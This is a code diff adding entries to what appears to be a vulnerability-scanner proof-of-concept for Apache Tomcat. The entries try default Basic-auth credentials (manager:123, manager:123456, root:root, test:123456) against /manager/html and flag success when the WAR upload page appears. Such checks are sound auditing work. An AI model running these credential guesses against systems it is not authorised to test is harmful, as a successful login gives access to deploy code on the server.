@@ -191,6 +191,138 @@ func init() {
         ]
       },
       "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/manager/html",
+        "follow_redirect": true,
+        "header": {
+          "Authorization": "Basic bWFuYWdlcjoxMjM="
+        },
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "Select WAR file to upload",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/manager/html",
+        "follow_redirect": true,
+        "header": {
+          "Authorization": "Basic bWFuYWdlcjoxMjM0NTY="
+        },
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "Select WAR file to upload",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/manager/html",
+        "follow_redirect": true,
+        "header": {
+          "Authorization": "Basic cm9vdDpyb290"
+        },
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "Select WAR file to upload",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/manager/html",
+        "follow_redirect": true,
+        "header": {
+          "Authorization": "Basic dGVzdDoxMjM0NTY="
+        },
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "Select WAR file to upload",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
     }
   ],
   "ExploitSteps": [
